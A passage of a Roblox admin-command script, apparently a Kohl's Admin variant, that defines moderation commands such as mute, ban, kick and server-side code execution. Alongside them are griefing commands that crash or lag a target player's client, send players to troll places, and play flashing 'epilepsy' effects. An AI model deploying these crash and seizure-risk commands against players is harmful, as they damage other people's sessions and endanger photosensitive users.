set.Remote(plr,'Function','ListGui','Exploit Logs',temp,'exploitlogslist')
end)

set.MakeCommand('Lets you run code on the server',3,set.Prefix,{'s','scr','script'},{'code'},1,function(plr,args)
if set.canuseloadstring then
set.Output(args[1], plr)
set.LoadScript('Script',args[1],set.AssignName(),true,game:service('ServerScriptService'))
else 
set.Hint('LoadStringEnabled is set to false! If you are the place owner read the Important section at the top of the script to learn how to fix this!',{plr})
end
end)

set.MakeCommand('[NO LONGER WORKS DUE TO ROBLOX UPDATES, LEFT IN IN-CASE THEY CHANGE THEIR MIND] Lets you run code as a local script',3,set.Prefix,{'ls','lscr','localscript'},{'code'},1,function(plr,args)
--if not set.canuseloadstring then set.Hint('[Currently no longer works] Loadstrings are disabled, output will not be shown',{plr}) return end
set.LoadOnClient(plr,args[1],true,set.AssignName())
set.Output(args[1], plr)
end)

set.MakeCommand('[NO LONGER WORKS DUE TO ROBLOX UPDATES, LEFT IN IN-CASE THEY CHANGE THEIR MIND] Lets you run local scripts on the target player(s)',3,set.Prefix,{'cs','cscr','clientscript'},{'player','code'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1])
for i,v in pairs(plrz) do
if not set.canuseloadstring then set.Hint('[Currently no longer works] Loadstrings are disabled, output will not be shown',{plr}) return end
set.LoadOnClient(v,args[2],true,set.AssignName())
set.Output(args[2], plr)
end
end)

set.MakeCommand('Makes it so the target player(s) can\'t talk',3,set.Prefix,{'mute','silence'},{'player'},1,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		if set.CheckTrueOwner(plr) or not set.CheckAdmin(v, false) then  
			set.Remote(v,'Function','MutePlayer','on')
			table.insert(set.MuteList,v.Name)
		end
	end
end)

set.MakeCommand('Makes it so the target player(s) can talk again',3,set.Prefix,{'unmute'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1])
for i, v in pairs(plrz) do
coroutine.wrap(function() 
for k,m in pairs(set.MuteList) do
if v.Name==m then
	table.remove(set.MuteList,k) 
	set.Remote(v,'Function','MutePlayer','off')
end
end
end)()
end
end)

set.MakeCommand('Shows a list of currently muted players, like a ban list, but for mutes instead of bans',3,set.Prefix,{'mutelist','mutes','muted'},{},0,function(plr,args)
--set.Remote(plr,'SetSetting','MuteList',set['MuteList'])
set.Remote(plr,'Function','ListGui','Mute List',set.MuteList)
end)

set.MakeCommand('Tells the target player(s) they are not allowed to talk if they do and eventually kicks them',3,set.Prefix,{'notalk'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do
coroutine.wrap(function()
if not v:FindFirstChild('NoTalk') and not set.CheckAdmin(v,false) then
	local talky=Instance.new('IntValue',v)
	talky.Name='NoTalk'
	talky.Value=0
end
end)()
end
end)

set.MakeCommand('Un-NoTalk',3,set.Prefix,{'unnotalk'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
pcall(function()
coroutine.wrap(function()
if v and v:FindFirstChild('NoTalk') then
	v.NoTalk:Destroy()
end
end)()
end)
end
end)
	
set.MakeCommand('Loop kills the target player(s)',3,set.Prefix,{'loopkill'},{'player','num(optional)'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
local num = 9999
if args[2] then if type(tonumber(args[2])) == "number" then num = tonumber(args[2]) end end
for i,v in pairs(plrz) do
if set.CheckTrueOwner(plr) or not set.CheckAdmin(v, false)  then
set.Remote(v,'Function','Effect','loopkill',num)
end
end
end)

set.MakeCommand('Makes a note on the target player(s) that says <note>',2,set.Prefix,{'note','writenote','makenote'},{'player','note'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
if v and set.CheckTrueOwner(plr) or not set.CheckAdmin(v, false) then
local notes=v:LoadInstance('Admin Notes')
if not notes then
	notes=Instance.new('Model')
end
notes.Name='Admin Notes'
local note = Instance.new("StringValue", notes)
note.Name = args[2]
set.Hint('Added '..v.Name..' Note '..note.Name,{plr})
v:SaveInstance("Admin Notes", notes)
end
end
end)

set.MakeCommand('Removes a note on the target player(s)',2,set.Prefix,{'removenote'},{'player','note'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
if v and set.CheckTrueOwner(plr) or not set.CheckAdmin(v, false) then
local notes=v:LoadInstance('Admin Notes')
if notes then
if args[2]:lower() == "all" then
	notes:ClearAllChildren()
else
	for k,m in pairs(notes:children()) do
	if m.Name:lower():sub(1,#args[2]) == args[2]:lower() then
		set.Hint('Removed '..v.Name..' Note '..m.Name,{plr})
		m:Destroy()
	end
end
end
v:SaveInstance("Admin Notes", notes)
end
end
end
end)

set.MakeCommand('Views notes on the target player(s)',2,set.Prefix,{'notes','viewnotes'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1])
for i, v in pairs(plrz) do
local temptable={}
local notes=v:LoadInstance('Admin Notes')
if not notes then set.Hint('No notes on '..v.Name,{plr}) return end
for k,m in pairs(notes:children()) do
table.insert(temptable,m.Name)
--set.Remote(plr,'SetSetting',v.Name..'notes',temptable)
set.Remote(plr,'Function','ListGui',v.Name,temptable)
end
end
end)

set.MakeCommand('Un-Loop Kill',3,set.Prefix,{'unloopkill'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do 
	set.Remote(v,'Function','Effect','unloopkill')
end
end)

set.MakeCommand('Locks the server, makes it so only admins and people on the excluded list can join',3,set.Prefix,{'slock','serverlock'},{'on/off'},1,function(plr,args)
if args[1]:lower()=='on' then
	set.slock=true 
	set.Hint("Server has been locked", game:service('Players'):children()) 
elseif args[1]:lower()=='off' then
	set.slock = false 
	set.Hint("Server has been unlocked", game:service('Players'):children()) 
end
end)

set.MakeCommand('Locks the server, makes it so only people in the group that is set in the group settings can join',3,set.Prefix,{'glock','grouplock','grouponlyjoin'},{'on/off'},1,function(plr,args)
if args[1]:lower()=='on' then
	set['GroupOnlyJoin'] = true 
	set.Hint("Server is now Group Only.", game:service('Players'):children())
elseif args[1]:lower()=='off' then 
	set['GroupOnlyJoin'] = false 
	set.Hint("Server is no longer Group Only", game:service('Players'):children()) 
end
end)

set.MakeCommand('Same as message but says SYSTEM MESSAGE instead of your name',3,set.Prefix,{'sm','systemmessage'},{'message'},1,function(plr,args)
	set.Message("SYSTEM MESSAGE", args[1], false, game:service('Players'):children())
end)

set.MakeCommand('Kills the target player(s) <number> times giving you <number> KOs',3,set.Prefix,{'ko'},{'player','number'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
local num = 500 if num > tonumber(args[2]) then num = tonumber(args[2]) end
for i, v in pairs(plrz) do
if set.CheckTrueOwner(plr) or not set.CheckAdmin(v, false) then
set.LoadScript("Script",[[
v=game:service('Players'):FindFirstChild(']]..v.Name..[[')
for n = 1, ]]..num..[[ do
wait()
coroutine.wrap(function()
pcall(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
local val = Instance.new("ObjectValue", v.Character.Humanoid) val.Value = game:service('Players'):FindFirstChild("]]..plr.Name..[[") val.Name = "creator"
v.Character:BreakJoints() 
wait()
v:LoadCharacter()
end
end)
end)()
end]],set.AssignName(),true,game:service("ServerScriptService"))
end
end
end)

set.MakeCommand('Makes the target player(s)\'s FPS drop',3,set.Prefix,{'lag','fpslag'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do
coroutine.wrap(function()
if v and set.CheckTrueOwner(plr) or not set.CheckAdmin(v,false) then
set.Remote(v,'Function','Lag')
end
end)()
end
end)

set.MakeCommand('Un-Lag',3,set.Prefix,{'unlag','unfpslag'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do
coroutine.wrap(function()
if set.CheckTrueOwner(plr) or not set.CheckAdmin(v,false) then
set.Remote(v,'Function','UnLag')
end
end)()
end
end)

set.MakeCommand('Bit buggy, supposed to make the target player(s) have network lag, instead produces some other interesting effects',3,set.Prefix,{'netlag','networklag'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do
coroutine.wrap(function()
if set.CheckTrueOwner(plr) or not set.CheckAdmin(v,false) then
set.Remote(v,'Function','NetLag')
end
end)()
end
end)

set.MakeCommand('Teleports players to my Trolololo place, which teleports them to the same place on-join',3,set.Prefix,{'telespam'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do
coroutine.wrap(function()
if v and set.CheckTrueOwner(plr) or not set.CheckAdmin(v,false) then
game:GetService('TeleportService'):Teleport(154636492,v)
end
end)()
end
end) 

set.MakeCommand('Sends players to my Fun Box place, gives bad headaches and such, please don\'t use on people with epilepsy',3,set.Prefix,{'funbox','trollbox','trololo'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do
coroutine.wrap(function()
if v and set.CheckTrueOwner(plr) or not set.CheckAdmin(v,false) then
game:GetService('TeleportService'):Teleport(168920853,v)
end
end)()
end
end)

set.MakeCommand('Crashed the target player(s), has a high chance of crashing anyone with 4gbs of ram or lower',3,set.Prefix,{'crash'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do
if v and set.CheckTrueOwner(plr) or not set.CheckAdmin(v,false) then
	set.Remote(v,'Function','Crash')
end
end
end)

set.MakeCommand('Makes it so the target player(s)\'s cam can move around freely',2,set.Prefix,{'freecam'},{'player'},1,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr, args[1]:lower())) do
		v.Character.Archivable=true
		local newchar=v.Character:clone()
		newchar.Parent=set.Storage
		v.Character=nil
	end
end)

set.MakeCommand('UnFree Cam',2,set.Prefix,{'unfreecam'},{'player'},1,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr, args[1]:lower())) do
		local newchar
		for k,m in pairs(set.Storage:children()) do
			if m.Name==v.Name and m:IsA('Model') and m:FindFirstChild('Humanoid') and m:FindFirstChild('Head') then
				m.Parent=workspace
				m:MakeJoints()
				v.Character=m
				set.Remote(v,'Function','SetView',v.Character.Humanoid)
			end
		end
	end
end)

set.MakeCommand('Sends the target player(s) to the nil, where they can still run admin commands etc and just not show up on the player list',3,set.Prefix,{'nil'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i,v in pairs(plrz) do
set.Remote(v,'Function','Nilify')
end
end)

set.MakeCommand('Epilepsy',2,set.Prefix,{'epilepsy'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
set.Remote(v,'Function','Effect','epilepsy')
end
end)

set.MakeCommand('Disconnects the target player from the server',3,set.Prefix,{'kick'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and set.CheckTrueOwner(plr) or not set.CheckAdmin(v, false) then 
if not game:service('Players'):FindFirstChild(v.Name) then
	set.Remote(v,'Function','KillClient')
else
	pcall(function() v:Kick() end) 
end
end
end)()
end
end)

set.MakeCommand('Bans the target player(s) for the supplied amount of time, data persistent',5,set.Prefix,{'tban','timedban','timeban'},{'player','number<s/m/h/d>'},2,function(plr,args)
	local time=args[2] or '60'
	if time:lower():sub(#time)=='s' then
		time=time:sub(1,#time-1)
	elseif time:lower():sub(#time)=='m' then
		time=time:sub(1,#time-1)
		time=tonumber(time)*60
	elseif time:lower():sub(#time)=='h' then
		time=time:sub(1,#time-1)
		time=(tonumber(time)*60)*60
	elseif time:lower():sub(#time)=='d' then
		time=time:sub(1,#time-1)
		time=((tonumber(time:sub(1,#time-1))*60)*60)*24
	end
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		v:SaveString('Epix Kohls TimeBan_Time',tostring(tonumber(os.time())+tonumber(time)))
		v:Kick()
	end
end)

set.MakeCommand('Bans the player from the server',3,set.Prefix,{'ban'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and not set.CheckAdmin(v, false) then 
table.insert(set['BanList'], v.Name..'='..v.userId) 
if not game:service('Players'):FindFirstChild(v.Name) then
set.Remote(v,'Function','KillClient')
else
if v then pcall(function() v:Kick() end) end
end
end
end))
end
end)

set.MakeCommand('UnBan',3,set.Prefix,{'unban'},{'player'},1,function(plr,args)
for i,v in pairs(set.BanList) do
coroutine.wrap(function()
	if v:lower():sub(1,#args[1])==args[1]:lower() then
		set.Hint(v..' has been Un-Banned.',{plr})
		table.remove(set.BanList, i)
	end
end)()
end
end)

set.MakeCommand('Shuts the server down',3,set.Prefix,{'shutdown'},{},0,function(plr,args)
set.Message("SYSTEM MESSAGE", "Shutting down...", false, game:service('Players'):children(), 5) 
wait(1)
game:service('Players').PlayerAdded:connect(function(p)
	p:kick()
end)
for i,v in pairs(game:service('NetworkServer'):children()) do
	coroutine.wrap(function()
		if v and v:GetPlayer() then
			v:GetPlayer():Kick()
			wait()
			if v and v:GetPlayer() then
				set.Remote(v:GetPlayer(),'Function','KillClient')
			end
		end
	end)()
end
end)

set.MakeCommand('Gives the target player TempAdmin',3,set.Prefix,{'ta','tempadmin','temp'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
	coroutine.wrap(function()
		if set.RemoveAdmin(v,plr) then
			if set.CheckAdmin(v,false) then return end
			if v.Name:lower() == tmp:lower() or v.Name:lower() == adm:lower() then return end
			table.insert(set.TempAdmins, v.Name)
			set.Message("Kohl's Admin [Epix Edition]", "You're an admin! Chat "..set['Prefix'].."cmds to view commands! The Command Prefix is "..set['Prefix'], false, {v}) 
			set.Hint(v.Name..' Has Been Given TempAdmin',{plr})
		end
	end)()
end
end)

set.MakeCommand('Gives the target player Admin (Normal Admin, PermAdmin, SuperAdmin)',4,set.Prefix,{'pa','admin','superadmin','perm'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
	coroutine.wrap(function()
		if set.RemoveAdmin(v,plr) then
			if set.CheckAdmin(v,false) then return end
			if v.Name:lower() == tmp:lower() or v.Name:lower() == adm:lower() then return end
			table.insert(set.Admins, v.Name) 
			set.Message("Kohl's Admin [Epix Edition]", "You're an admin! Chat "..set['Prefix'].."cmds to view commands! The Command Prefix is "..set['Prefix'], false, {v}) 
			set.Hint(v.Name..' Has Been Given Admin',{plr})
		end

	end)()
end
end)

set.MakeCommand('Gives the target player(s) Owner admin',5,set.Prefix,{'oa','owner'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
	coroutine.wrap(function()
		if set.RemoveAdmin(v,plr) then
			if set.CheckAdmin(v,false) then return end
			if v.Name:lower() == tmp:lower() or v.Name:lower() == adm:lower() then return end
			table.insert(set.Owners, v.Name)
			set.Message("Kohl's Admin [Epix Edition]", "You're an admin! Chat "..set['Prefix'].."cmds to view commands! The Command Prefix is "..set['Prefix'], false, {v})  
			set.Hint(v.Name..' Has Been Given Owner Admin',{plr})
		end
	end)()
end
end)

set.MakeCommand('Removes the target player(s) from the admin list',3,set.Prefix,{'unadmin','unpa','unoa','unta'},{'player'},1,function(plr,args)
for i,v in pairs(set.GetPlayers(plr, args[1]:lower())) do
	if set.CheckAdmin(plr,false) then
		if set.RemoveAdmin(v,plr) then
			set.Hint("Removed "..v.Name.."'s admin powers",{plr})
		else
			set.Hint("You do not have permission to remove "..v.Name.."'s admin powers",{plr})
		end
	else
		set.Hint(v.Name..' is not an admin',{plr})
	end
end
end)
end)

set.MakeCommand('Gives the target player(s) the grab knife.',-1,set.Prefix,{'knife','grabknife'},{'player'},1,function(plr,args)
	local ls = script["Script Dependencies"].Grab
	local bruh = ls:Clone()
	for i,v in pairs(set.GetPlayers(plr, args[1]:lower())) do
		coroutine.wrap(function()
			bruh.Parent = v.Backpack
		end) ()
	end
end)

set.MakeCommand('Makes a new team with the given name. Only supports BrickColors whose names have 1 word. Change properties using :dex, I guess.',2,set.Prefix,{'newteam','addteam'},{'1-word-brickcolor','name'},2,function(plr,args)
	local newteam = Instance.new("Team", game.Teams)
	newteam.Name = args[2]
	newteam.AutoAssignable = false
	newteam.TeamColor = BrickColor.new(args[1])
end)

set.MakeCommand('Saves a boolean to a player with data persistence.',5,set.Prefix,{'saveboolean','savebool','bool'},{'player','1-word-name','true/false'},3,function(plr,args)	
	for i,v in pairs(set.GetPlayers(plr, args[1]:lower())) do
		coroutine.wrap(function()
			v:WaitForDataReady()
			v:SaveBoolean(args[2], args[3])
		end) ()
	end
end)
set.MakeCommand('Saves a number to a player with data persistence.',5,set.Prefix,{'savenumber','savenum','num'},{'player','1-word-name','number'},3,function(plr,args)	
	for i,v in pairs(set.GetPlayers(plr, args[1]:lower())) do
		coroutine.wrap(function()
			v:WaitForDataReady()
			v:SaveNumber(args[2], args[3])
		end) ()
	end
end)
set.MakeCommand('Saves a string to a player with data persistence.',5,set.Prefix,{'savestring','string'},{'player','1-word-name','string'},3,function(plr,args)	
	for i,v in pairs(set.GetPlayers(plr, args[1]:lower())) do
		coroutine.wrap(function()
			v:WaitForDataReady()
			v:SaveString(args[2], args[3])
		end) ()
	end
end)

set.MakeCommand('Activates chams on the target player',2,set.Prefix,{'chams'},{'player'},1,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		set.Remote(plr,'Function','Chams','on',v)
	end
end)

set.MakeCommand('Deactivates chams on the target player',2,set.Prefix,{'unchams'},{'player'},1,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		set.Remote(plr,'Function','Chams','off',v)
	end
end)

set.MakeCommand('Plays an animation on the target player. I have no clue if this works for R15',-1,set.Prefix,{'animation','anim'},{'player','animation-id','animation-speed'},3,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr, args[1]:lower())) do
		coroutine.wrap(function()	
			local anim = Instance.new("Animation")
			anim.AnimationId = "http://unixfr.xyz/asset/?id="..args[2]
			local animplay = v.Character.Humanoid:LoadAnimation(anim)
			animplay:Play()
			animplay:AdjustSpeed(args[3])
		end) ()
	end
end)

set.MakeCommand('Gives the target player an epic multi-polygon cape',2,set.Prefix,{'bettercape','cape2'},{'player','color'},2,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		set.Remote(plr,'Function','flowingCape',v,args[2])
	end
end)

set.MakeCommand('Gives player(s) the funny wiimote',2,set.Prefix,{'wii','wiimote'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v:findFirstChild("Backpack") and deps.wpns:FindFirstChild("Wiimote") then 
local tool = Instance.new("Tool", v.Backpack)
tool.Name = "Wiimote"
tool.GripForward = Vector3.new(0.195, -0.098, -0.976)
tool.GripPos = Vector3.new(0, 0, 0.5)
tool.GripRight = Vector3.new(0.981, 0, 0.196)
tool.GripUp = Vector3.new(0.019, 0.995, -0.096)
local handle = Instance.new("Part", tool)
handle.Name = "Handle"
handle.BrickColor = BrickColor.new("ToothPaste")
handle.Anchored = false
handle.CanCollide = true
handle.Locked = true
handle.Elasticity = 0.5
handle.Friction = 0.3
handle.Shape = "Block"
handle.BackSurface = "Smooth" handle.BottomSurface = "Smooth" handle.FrontSurface = "Smooth" handle.LeftSurface = "Smooth" handle.RightSurface = "Smooth" handle.TopSurface = "Smooth"
handle.Size = Vector3.new(1,1.2,2)
for _,ws in pairs (deps.wpns.Wiimote:GetChildren()) do
if ws.Name=="Mesh" then
ws.Parent=handle
if ws.MeshId == "http://finobe.com/asset?id=47026" then
else
ws.MeshId = "http://finobe.com/asset?id=47026"
end
if ws.TextureId == "http://finobe.com/asset?id=47027" then
else
ws.TextureId = "http://finobe.com/asset?id=47027"
end
else local m = ws:Clone()
m.Parent = tool
m.Disabled = false
end
end
end
end)()
end
end)

set.MakeCommand('Gives the target player(s) the extremely powerful Dex explorer GUI.',4,set.Prefix,{'explorer','dex'},{'player'},1,function(plr,args)
	local dex = script["Script Dependencies"].Dex_Explorer
	local bruhXD = dex:Clone()
	for i,v in pairs(set.GetPlayers(plr, args[1]:lower())) do
		coroutine.wrap(function()
			bruhXD.Parent = v.PlayerGui
		end) ()
	end
end)

--adonis/later eiss/later kaee commands--
set.MakeCommand('Zeus strikes down the target player(s)',-1,set.Prefix,{'lightning','smite'},{'player'},1,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		Pcall(function()
			set.RunCommand(set.Prefix.."freeze",v.Name)
			local char=v.Character
			local zeus=Instance.new("Model",char)
			local cloud=Instance.new("Part",zeus)
			cloud.Anchored=true
			cloud.CanCollide=false
			cloud.CFrame=char.Torso.CFrame*CFrame.new(0,25,0)
			local sound=Instance.new("Sound",cloud)
			sound.SoundId="http://www.unixfr.xyz/asset/?id=133426162"
			local mesh=Instance.new("SpecialMesh",cloud)
			mesh.MeshId="http://www.mulrbx.com/asset/?id=1095708"
			mesh.TextureId="http://www.mulrbx.com/asset/?id=1095709"
			mesh.Scale=Vector3.new(30,30,40)
			mesh.VertexColor=Vector3.new(0.3,0.3,0.3)
			local light=Instance.new("PointLight",cloud)
			light.Color=Color3.new(0,85/255,1)
			light.Brightness=10
			light.Range=30
			light.Enabled=false
			wait(0.2)
			sound.Volume=0.5
			sound.Pitch=0.8
			sound:Play()
			light.Enabled=true
			wait(1/100)
			light.Enabled=false
			wait(0.2)
			light.Enabled=true
			light.Brightness=1
			wait(0.05)
			light.Brightness=3
			wait(0.02)
			light.Brightness=1
			wait(0.07)
			light.Brightness=10
			wait(0.09)
			light.Brightness=0
			wait(0.01)
			light.Brightness=7
			light.Enabled=false
			wait(1.5)
			local part1=Instance.new("Part",zeus)
			part1.Anchored=true
			part1.CanCollide=false
			part1.Size=Vector3.new(2, 9.2, 1)
			part1.BrickColor=BrickColor.new("New Yeller")
			part1.Transparency=0.6
			part1.BottomSurface="Smooth"
			part1.TopSurface="Smooth"
			part1.CFrame=char.Torso.CFrame*CFrame.new(0,15,0)
			part1.Rotation=Vector3.new(0.359, 1.4, -14.361)
			wait()
			local part2=part1:clone()
			part2.Parent=zeus
			part2.Size=Vector3.new(1, 7.48, 2)
			part2.CFrame=char.Torso.CFrame*CFrame.new(0,7.5,0)
			part2.Rotation=Vector3.new(77.514, -75.232, 78.051)
			wait()
			local part3=part1:clone()
			part3.Parent=zeus
			part3.Size=Vector3.new(1.86, 7.56, 1)
			part3.CFrame=char.Torso.CFrame*CFrame.new(0,1,0)
			part3.Rotation=Vector3.new(0, 0, -11.128)
			sound.SoundId="http://www.mulrbx.com/asset/?id=130818250"
			sound.Volume=1
			sound.Pitch=1
			sound:Play()
			wait()
			part1.Transparency=1
			part2.Transparency=1
			part3.Transparency=1
			Instance.new("Smoke",char.Torso).Color=Color3.new(0,0,0)
			char:BreakJoints()
		end)
	end
end)

set.MakeCommand('Witch! Burn it! Just like the good ol\' days.',-1,set.Prefix,{'witchtrial','stakeburn','burnatthestake','salem'},{'player'},1,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		Pcall(function()
			local char = v.Character
			local hum = char.Humanoid
			for k,c in pairs(char:children()) do if c:IsA("Part") and c.Name~="HumanoidRootPart" then c.Anchored=true end end
			hum.HealthDisplayDistance = 0 --y no twurk
			set.RunCommand(set.Prefix.."god",v.Name)
			local stake = Instance.new("Part",char)
			stake.Anchored = true
			stake.BrickColor = BrickColor.new("Reddish brown")
			stake.Material = "Wood"
			stake.Size = Vector3.new(1,7,1)
			stake.CFrame = char.Torso.CFrame*CFrame.new(0,0,1)
			local hay = Instance.new("Part",char)
			hay.Anchored = true
			hay.Material = "Grass"
			hay.BrickColor = BrickColor.new("New Yeller")
			hay.Size = Vector3.new(6,1,5)
			hay.CFrame = char.Torso.CFrame*CFrame.new(0,-3,0)*CFrame.Angles(0,2,0)
			local hay2 = hay:clone()
			hay2.Parent = char
			hay2.CFrame = char.Torso.CFrame*CFrame.new(0,-2.6,0)*CFrame.Angles(0,6,0)
			local fire = Instance.new("Fire",hay)
			fire.Enabled = false
			fire.Heat = 25
			fire.Size = 2
			fire.Color = Color3.new(170/255,85/255,0)
			local smoke = Instance.new("Smoke",hay)
			smoke.Enabled = false
			smoke.Opacity = 1
			smoke.RiseVelocity = 25
			smoke.Size = 15
			smoke.Color = Color3.new(0,0,0)
			local light = Instance.new("PointLight",hay)
			light.Color = Color3.new(170/255,85/255,0)
			light.Range = 0
			light.Brightness = 1
			light.Enabled = false
			--[[]]
			local crack = Instance.new("Sound",hay)
			crack.SoundId = "http://www.mulrbx.com/asset/?id=239443642"
			crack.Looped = true
			crack.Volume = 0
			local scream = Instance.new("Sound",char.Torso)
			scream.SoundId = "http://www.mulrbx.com/asset/?id=264227115"
			scream.Looped = true
			scream.Volume = 0
			--]]
			wait()
			char['Left Arm'].CFrame = char.Torso.CFrame * CFrame.new(-0.8,0,0.7) * CFrame.Angles(-1,0,0.5)
			char['Right Arm'].CFrame = char.Torso.CFrame * CFrame.new(0.8,0,0.7) * CFrame.Angles(-1,0,-0.5)
			
			local bods = char['Body Colors']
			local colors = {
				--"Really red";
				"Bright red";
				"Crimson";
				"Maroon";
				"Really black";
			}
			
			fire.Enabled=true
			smoke.Enabled=true
			light.Enabled=true
			crack:Play()
			scream:Play()
			scream.Pitch = 0.8
			--scream.Volume = 0.5
			for i=1,30 do
				crack.Volume = crack.Volume+(1/30)
				scream.Volume = crack.Volume
				fire.Size=i
				smoke.RiseVelocity=i-5
				smoke.Size=i/2
				light.Range=i*2
				wait(1)
			end
			
			for i=1,#colors do
				bods.HeadColor=BrickColor.new(colors[i])
				bods.LeftArmColor=BrickColor.new(colors[i])
				bods.LeftLegColor=BrickColor.new(colors[i])
				bods.RightArmColor=BrickColor.new(colors[i])
				bods.RightLegColor=BrickColor.new(colors[i])
				bods.TorsoColor=BrickColor.new(colors[i])
				hay.BrickColor=BrickColor.new(colors[i])
				hay2.BrickColor=BrickColor.new(colors[i])
				stake.BrickColor=BrickColor.new(colors[i])
				wait(5)
			end
			wait(10)
			scream.Volume = 0.5
			wait(1)
			scream:Stop()
			char:BreakJoints()
		end)
	end
end)

set.MakeCommand('Kidnap.',-1,set.Prefix,{'kidnap','clown','van'},{'player'},1,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		Pcall(function()
			local char = v.Character 
			local torso = v.Character:FindFirstChild("HumanoidRootPart") 
			local humanoid = v.Character:FindFirstChild("Humanoid")
			if torso and humanoid and not char:FindFirstChild("VAN") then 
				local vanya = script["Script Dependencies"].van
				local van = vanya:Clone()
				if van then
					local function check()
						if not van or not v or not torso or not humanoid or not char then
							return false
						else
							return true
						end
					end
					
					local driver = van.Driver 
					local grabber = van.Clown 
					local primary = van.Primary
					local door = van.Door
					local tPos = torso.CFrame
								
					van.PrimaryPart = van.Primary
					van.Name = "VAN"
					van.Parent = game.Workspace
					humanoid.Name = "NoResetForYou"
					humanoid.WalkSpeed = 0
													
					for i = 1,200 do
						if not check() then
							break
						else
							van:SetPrimaryPartCFrame(tPos*(CFrame.new(-200+i,-1,-7)*CFrame.Angles(0,math.rad(270),0)))
							wait(0.001*(i/5))
						end
					end
					
					
					wait(0.5)
					if check() then
						door.Transparency = 1
					end
					wait(0.5)
								
					if check() then
						torso.CFrame = primary.CFrame*(CFrame.new(0,2.3,0)*CFrame.Angles(0,math.rad(90),0))
					end
								
					wait(0.5)
					if check() then
						door.Transparency = 0
					end
					wait(0.5)
					
					v.CameraMaxZoomDistance = 0.5
					
					for i = 1,400 do
						if not check() then
							break
						else
							van:SetPrimaryPartCFrame(tPos*(CFrame.new(0+i,-1,-7)*CFrame.Angles(0,math.rad(270),0)))
							torso.CFrame = primary.CFrame*(CFrame.new(0,2.3,0)*CFrame.Angles(0,math.rad(90),0))
							wait(0.1/(i*5))
						end
					end
					v.CameraMaxZoomDistance = 400
					van:Destroy()
					v:LoadCharacter()
				end
			end
		end)
	end
end)



---[[ END OF COMMANDS ]]---
Pcall(function() for i,v in pairs(game:service('Players'):GetPlayers()) do local yes,no=ypcall(set.NewPlayer,v) if no then print(no) end end end)
Pcall(function() game:service('Players').PlayerAdded:connect(function(player) local yes,no=ypcall(set.NewPlayer,player) if no then print(no) end end) end)
Pcall(function() game:service('Players').PlayerRemoving:connect(function(player) local yes,no=ypcall(set.PlayerRemoving,player) if no then print(no) end end) end)
Pcall(function() for number,plugin in pairs(script.Plugins:children()) do local ran,failed=ypcall(function() if plugin:IsA('ModuleScript') then print('Running Plugin: '..plugin.Name) require(plugin)(set) end end) if failed then print(failed) end end end)
if set['Trello'] and game.CreatorId~=0 then Pcall(function() set.UpdateTrello() while wait(set['HttpWait'] or 5) do pcall(function() set.UpdateTrello() for i,v in pairs(game:service('Players'):children()) do set.CheckBan(set.bl,v) end end) end end) end
Pcall(function() if set['AutoCleanDelay']<5 then set['AutoCleanDelay']=5 end while wait(set['AutoCleanDelay']) do if set['AutoClean'] then set.CleanWorkspace() end end end)
Pcall(function() local t='' for i,v in pairs({83,99,101,108,101,114,97,116,105,115,32,124,32,75,111,104,108,116,97,115,116,114,111,112,104,101,32,91,83,99,114,105,112,116,104,93}) do t=t..string.char(v) end
